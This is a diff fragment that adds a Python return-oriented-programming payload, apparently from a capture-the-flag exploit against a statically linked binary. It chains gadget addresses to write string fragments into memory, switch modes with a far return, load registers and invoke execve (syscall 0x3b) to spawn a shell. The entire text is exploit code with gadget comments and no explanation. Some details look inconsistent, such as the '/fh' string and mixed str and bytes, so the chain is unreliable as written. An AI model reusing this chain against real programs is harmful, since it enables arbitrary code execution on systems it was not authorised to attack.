@@ -1,0 +1,53 @@
+payload = p64(0x410aff)
+#0x410aff: pop rcx ; retf 1
+payload += p64(0x6e69622f)+p32(0x4011ad)+p32(0x33)+"\x00"*1
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x4400d5)+p64(0x41361a)
+# 0x000000000041361a: xchg ebp, eax; ret; 
+payload += p64(0x409310)
+# 0x0000000000409310: add dword ptr [rax - 0x7d], ecx; ret; 
+payload += p64(0x410aff)
+# 0x410aff: pop rcx ; retf 1
+payload += p64(0x68662f)+p32(0x4011ad)+p32(0x33)+"\x00"*1
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x4400d9)+p64(0x41361a)
+# 0x000000000041361a: xchg ebp, eax; ret; 
+payload += p64(0x409310)
+# 0x0000000000409310: add dword ptr [rax - 0x7d], ecx; ret; 
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x404dd2)+p64(0x41361a)
+# 0x000000000041361a: xchg ebp, eax; ret; 
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x0)+p64(0x421e75)
+# 0x0000000000421e75: mov edx, ebp; mov rsi, rbx; mov rdi, rbp; call rax; 
+payload += b''
+# 0x0000000000404dd2: pop r12; pop r13; ret; 
+payload += p64(0x0)+p64(0x404dd0)
+# 0x0000000000404dd0: pop rbx; pop rbp; pop r12; pop r13; ret; 
+payload += p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x404dd2)+p64(0x41361a)
+# 0x000000000041361a: xchg ebp, eax; ret; 
+payload += p64(0x421e78)
+# 0x0000000000421e78: mov esi, ebx; mov rdi, rbp; call rax; 
+payload += b''
+# 0x0000000000404dd2: pop r12; pop r13; ret; 
+payload += p64(0x0)+p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x404dd2)+p64(0x41361a)
+# 0x000000000041361a: xchg ebp, eax; ret; 
+payload += p64(0x404dd0)
+# 0x0000000000404dd0: pop rbx; pop rbp; pop r12; pop r13; ret; 
+payload += p64(0x0)+p64(0x440058)+p64(0x0)+p64(0x0)+p64(0x421e7b)
+# 0x0000000000421e7b: mov edi, ebp; call rax; 
+payload += b''
+# 0x0000000000404dd2: pop r12; pop r13; ret; 
+payload += p64(0x0)+p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x3b)+p64(0x41361a)
+# 0x000000000041361a: xchg ebp, eax; ret; 
+payload += p64(0x402440)
+# 0x0000000000402440: syscall; 
+payload += b''
